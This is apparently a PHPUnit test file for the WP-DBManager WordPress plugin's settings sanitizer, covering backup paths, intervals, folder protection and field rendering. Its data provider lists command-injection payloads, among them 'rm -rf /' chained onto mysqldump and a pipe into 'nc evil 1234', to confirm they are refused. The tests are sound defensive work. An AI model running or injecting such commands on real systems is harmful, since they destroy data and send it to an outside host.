<?php
/**
 * The Settings API screen.
 *
 * @package WP-DBManager
 */

/**
 * The sanitize callback is the whole safety net for this screen, so it is
 * tested against the values a browser actually sends: strings, every time.
 */
class WP_DBManager_Settings_Test extends WP_DBManager_TestCase {

	/**
	 * A full, valid submission round-trips unchanged.
	 */
	public function test_valid_submission_is_stored() {
		$input = array(
			'mysqldumppath'          => '/usr/bin/mysqldump',
			'mysqlpath'              => '/usr/bin/mysql',
			'path'                   => $this->backup_dir,
			'max_backup'             => '7',
			'backup'                 => '2',
			'backup_gzip'            => '0',
			'backup_period'          => '86400',
			'backup_email'           => 'harness@example.com',
			'backup_email_attach'    => '0',
			'backup_email_from'      => 'from@example.com',
			'backup_email_from_name' => 'Harness Sender',
			'backup_email_subject'   => '%SITE_NAME% dump %POST_DATE%',
			'optimize'               => '5',
			'optimize_period'        => '3600',
			'repair'                 => '4',
			'repair_period'          => '604800',
			'hide_admin_notices'     => '1',
		);

		$result = WP_DBManager_Settings::sanitize( $input );

		$this->assertSame( 7, $result['max_backup'], 'The backup count is stored.' );
		$this->assertSame( 2, $result['backup'], 'The backup mode.' );
		$this->assertSame( 0, $result['backup_gzip'], 'The compression toggle.' );
		$this->assertSame( 86400, $result['backup_period'], 'The backup interval.' );
		$this->assertSame( 'harness@example.com', $result['backup_email'], 'The address to mail.' );
		$this->assertSame( 0, $result['backup_email_attach'], 'The attachment toggle.' );
		$this->assertSame( 'Harness Sender', $result['backup_email_from_name'], 'The sender name.' );
		$this->assertSame( '%SITE_NAME% dump %POST_DATE%', $result['backup_email_subject'], 'The subject, tokens and all.' );
		$this->assertSame( 3600, $result['optimize_period'], 'The optimize interval.' );
		$this->assertSame( 604800, $result['repair_period'], 'The repair interval.' );
		$this->assertSame( 1, $result['hide_admin_notices'], 'The notice toggle.' );
		$this->assertSame( $this->backup_dir, $result['path'], 'And the backup folder.' );
	}

	/**
	 * Moving the backup folder takes its protection with it.
	 *
	 * The folder was created on activation and from the "try to fix" notice and
	 * nowhere else, so moving the folder on this screen pointed backups at a bare
	 * directory. The shipped default is inside wp-content, which is served, and
	 * a dump holds the users table.
	 */
	public function test_moving_the_backup_folder_takes_its_protection_with_it() {
		$destination = WP_CONTENT_DIR . '/wp-dbmanager-moved-' . wp_generate_password( 8, false, false );
		wp_mkdir_p( $destination );

		$this->assertFileDoesNotExist( $destination . '/index.php', 'The new folder starts bare, or this proves nothing.' );

		try {
			WP_DBManager_Settings::sanitize( array( 'path' => $destination ) );

			$this->assertFileExists( $destination . '/index.php', 'The folder being moved to is given its silence-is-golden guard.' );
			$this->assertFileExists( $destination . '/.htaccess', 'And the server rule that keeps a dump from being downloaded.' );
		} finally {
			foreach ( array( '/index.php', '/.htaccess', '/Web.config' ) as $leaf ) {
				if ( file_exists( $destination . $leaf ) ) {
					wp_delete_file( $destination . $leaf );
				}
			}
			@rmdir( $destination ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged, WordPress.WP.AlternativeFunctions.file_system_operations_rmdir -- Fixture clean-up; a leftover empty directory is not worth failing a test over.
		}
	}

	/**
	 * A backup path that does not resolve is refused and the old one kept.
	 */
	public function test_unresolvable_backup_path_is_refused() {
		$result = WP_DBManager_Settings::sanitize( array( 'path' => '/no/such/directory/anywhere' ) );

		$this->assertSame( $this->backup_dir, $result['path'], 'A path that does not resolve is refused and the stored one stands.' );
		$this->assertNotEmpty( get_settings_errors( WP_DBManager_Options::OPTION ), 'An unresolvable backup path is refused with a message rather than saved.' );
	}

	/**
	 * Shell metacharacters in either binary path are refused.
	 *
	 * @dataProvider data_dangerous_paths
	 *
	 * @param string $key   Setting to poison.
	 * @param string $value Submitted value.
	 */
	public function test_dangerous_binary_paths_are_refused( $key, $value ) {
		$before = WP_DBManager_Options::get( $key );

		$result = WP_DBManager_Settings::sanitize( array( $key => $value ) );

		$this->assertSame( $before, $result[ $key ], 'A binary path that is not a binary is refused and the stored one stands.' );
	}

	/**
	 * Paths that must never reach a shell command.
	 *
	 * @return array
	 */
	public function data_dangerous_paths() {
		return array(
			'command chained onto mysqldump' => array( 'mysqldumppath', '/usr/bin/mysqldump; rm -rf /' ),
			'pipe onto mysql'                => array( 'mysqlpath', '/usr/bin/mysql|nc evil 1234' ),
			'redirect onto mysqldump'        => array( 'mysqldumppath', '/usr/bin/mysqldump > /tmp/x' ),
			'quoted argument on mysql'       => array( 'mysqlpath', '/usr/bin/mysql "x"' ),
		);
	}

	/**
	 * An interval the screen does not offer is refused rather than stored.
	 *
	 * This is the failure the skill calls out by name: a setting that reports
	 * "saved" and then silently reverts, because the screen and the sanitizer
	 * disagreed about the list of acceptable values. Both read
	 * WP_DBManager_Options::periods(), so they cannot.
	 */
	public function test_unknown_interval_is_refused() {
		$before = WP_DBManager_Options::get( 'backup_period' );

		$result = WP_DBManager_Settings::sanitize( array( 'backup_period' => '999' ) );

		$this->assertSame( $before, $result['backup_period'], 'An interval off the allow list is refused and the stored one stands.' );
	}

	/**
	 * Every interval the screen offers is accepted.
	 */
	public function test_offered_intervals_are_all_accepted() {
		foreach ( array_keys( WP_DBManager_Options::periods() ) as $seconds ) {
			$result = WP_DBManager_Settings::sanitize( array( 'backup_period' => (string) $seconds ) );

			$this->assertSame( $seconds, $result['backup_period'], 'Interval ' . $seconds . ' was rejected.' );
		}
	}

	/**
	 * Saving one part of the screen does not blank the rest.
	 */
	public function test_partial_submission_keeps_untouched_keys() {
		$result = WP_DBManager_Settings::sanitize( array( 'max_backup' => '3' ) );

		$this->assertSame( 3, $result['max_backup'], 'A partial submission leaves the key it did not mention alone.' );
		$this->assertSame( WP_DBManager_Options::get( 'backup_email_subject' ), $result['backup_email_subject'], 'Including the subject.' );
		$this->assertSame( WP_DBManager_Options::get( 'mysqlpath' ), $result['mysqlpath'], 'And the binary paths, which are the expensive ones to lose.' );
	}

	/**
	 * Anything that is not an array leaves the settings alone.
	 */
	public function test_non_array_input_is_ignored() {
		$this->assertSame( WP_DBManager_Options::get(), WP_DBManager_Settings::sanitize( 'nonsense' ), 'A string where an array was expected changes nothing.' );
		$this->assertSame( WP_DBManager_Options::get(), WP_DBManager_Settings::sanitize( null ), 'And neither does null.' );
	}

	/**
	 * A negative maximum cannot be stored.
	 */
	public function test_counts_cannot_go_negative() {
		$result = WP_DBManager_Settings::sanitize( array( 'max_backup' => '-5' ) );

		$this->assertSame( 0, $result['max_backup'], 'A negative count is floored at zero rather than stored.' );
	}

	/**
	 * Saving flushes the cached folder reachability answer.
	 *
	 * The backup folder may have moved, so the cached verdict is about
	 * somewhere else now.
	 */
	public function test_saving_flushes_the_reachability_cache() {
		set_transient( WP_DBManager_Folder::TRANSIENT, 'protected', HOUR_IN_SECONDS );

		WP_DBManager_Settings::sanitize( array( 'max_backup' => '4' ) );

		$this->assertFalse( get_transient( WP_DBManager_Folder::TRANSIENT ), 'Saving flushes the reachability cache, so a moved folder is probed again.' );
	}

	/**
	 * The option is registered against the group the screen posts to.
	 */
	public function test_option_is_registered() {
		WP_DBManager_Settings::register();

		$registered = get_registered_settings();

		$this->assertArrayHasKey( WP_DBManager_Options::OPTION, $registered, 'The settings row is registered, so its sanitise callback is attached.' );
	}

	/**
	 * The settings group is the settings row name.
	 */
	public function test_the_group_is_the_option_row_name() {
		$this->assertSame( WP_DBManager_Options::OPTION, WP_DBManager_Settings::GROUP, 'The settings group is the option row name.' );
		$this->assertSame( 'wp_dbmanager_options', WP_DBManager_Settings::GROUP, 'Which is this, so a rename has to change both.' );
	}

	/**
	 * Four sections are registered against the Settings page.
	 */
	public function test_the_sections_are_registered_against_the_options_page() {
		global $wp_settings_sections;

		$wp_settings_sections = array();

		WP_DBManager_Settings::register();

		$page = WP_DBManager_Settings::page();

		$this->assertSame( 'wp-dbmanager-options', $page, 'The sections are registered against the options page.' );
		$this->assertArrayHasKey( $page, $wp_settings_sections, 'The sections are registered against the options page.' );

		$this->assertSame(
			array(
				WP_DBManager_Settings::SECTION_PATHS,
				WP_DBManager_Settings::SECTION_SCHEDULE,
				WP_DBManager_Settings::SECTION_EMAIL,
				WP_DBManager_Settings::SECTION_MISC,
			),
			array_keys( $wp_settings_sections[ $page ] ),
			'And these are the sections, in this order.'
		);
	}

	/**
	 * Every registered field has a field_<name>() method behind it, and it prints.
	 *
	 * A typo in the callback name is not a fatal -- core skips a field it cannot
	 * call -- so the setting simply vanishes from the screen, which is exactly
	 * the kind of silence worth a test.
	 */
	public function test_every_registered_field_renders_through_its_own_method() {
		global $wp_settings_fields;

		$wp_settings_fields = array();

		WP_DBManager_Settings::register();

		$page = WP_DBManager_Settings::page();

		$this->assertArrayHasKey( $page, $wp_settings_fields, 'The fields are registered against the options page.' );

		$seen = 0;

		foreach ( $wp_settings_fields[ $page ] as $section => $fields ) {
			foreach ( $fields as $id => $field ) {
				$this->assertSame(
					array( 'WP_DBManager_Settings', 'field_' . $id ),
					$field['callback'],
					"The {$id} field must be rendered by field_{$id}()."
				);

				$html = $this->render( $field['callback'] );

				$this->assertNotEmpty( $html, "field_{$id}() rendered nothing." );
				$this->assertStringNotContainsString( 'style=', $html, "field_{$id}() uses an inline style." );
				++$seen;
			}
		}

		$this->assertSame( 12, $seen, 'Twelve settings are rendered by the screen.' );
	}

	/**
	 * The screen writes no table of its own; do_settings_sections() emits it.
	 */
	public function test_the_screen_does_not_hand_roll_a_form_table() {
		$source = wp_dbmanager_test_read( 'includes/class-wp-dbmanager-settings.php' );

		// Comments stripped first. The class docblock explains that 3.0.0 printed
		// its own <table class="form-table"> rows and 4.0.0 does not, so leaving
		// the prose in means the file describing the fix reads as the fix being
		// absent. Match code, not English.
		$code = php_strip_whitespace( dirname( __DIR__ ) . '/includes/class-wp-dbmanager-settings.php' );

		$this->assertStringNotContainsString(
			'<table class="form-table"',
			$code,
			'Section 4.2 allows zero hand-written form tables.'
		);
		$this->assertStringContainsString( 'do_settings_sections(', $source, 'The screen renders the sections through core.' );
		$this->assertStringContainsString( 'add_settings_section(', $source, 'Which are registered through core.' );
		$this->assertStringContainsString( 'add_settings_field(', $source, 'And so are their fields, rather than a form table written by hand.' );
	}
}
